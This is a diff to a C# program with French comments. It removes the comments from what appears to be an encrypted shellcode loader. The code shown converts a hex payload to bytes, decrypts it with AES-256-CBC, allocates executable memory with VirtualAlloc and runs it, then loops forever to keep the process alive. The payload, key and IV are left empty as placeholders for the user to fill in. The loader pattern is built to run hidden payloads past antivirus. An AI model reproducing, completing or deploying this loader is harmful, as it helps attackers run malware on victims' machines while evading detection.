@@ -29,19 +29,15 @@ class Program
 
         try
         {
-            // Charger le payload HEX (remplacez par votre payload.hex)
             string hexPayload = ""; // Remplacez par votre payload.hex
 
-            // Convertir le payload hexadécimal en tableau de bytes
             byte[] encryptedPayload = HexStringToByteArray(hexPayload);
 
-            // Déchiffrement AES-256-CBC
             byte[] key = HexStringToByteArray(""); // Clé AES
             byte[] iv = HexStringToByteArray(""); // IV
 
             byte[] decryptedPayload = DecryptAES(encryptedPayload, key, iv);
 
-            // Allocation mémoire et exécution
             IntPtr addr = VirtualAlloc(IntPtr.Zero, (uint)decryptedPayload.Length, 0x3000, 0x40);
             if (addr == IntPtr.Zero)
             {
@@ -62,7 +58,6 @@ class Program
             
         }
 
-        // Boucle infinie pour maintenir l'application en cours d'exécution
         while (true)
         {
             System.Threading.Thread.Sleep(1000);
@@ -94,16 +89,13 @@ class Program
 
     static byte[] HexStringToByteArray(string hex)
     {
-        // Supprimez les espaces et les sauts de ligne
         hex = hex.Replace(" ", "").Replace("\n", "").Replace("\r", "");
 
-        // Vérifiez que la longueur est paire
         if (hex.Length % 2 != 0)
         {
             throw new ArgumentException("La chaîne hexadécimale doit avoir une longueur paire.");
         }
 
-        // Convertissez la chaîne hexadécimale en tableau de bytes
         byte[] bytes = new byte[hex.Length / 2];
         for (int i = 0; i < hex.Length; i += 2)
         {
@@ -112,3 +104,4 @@ class Program
         return bytes;
     }
 }
+
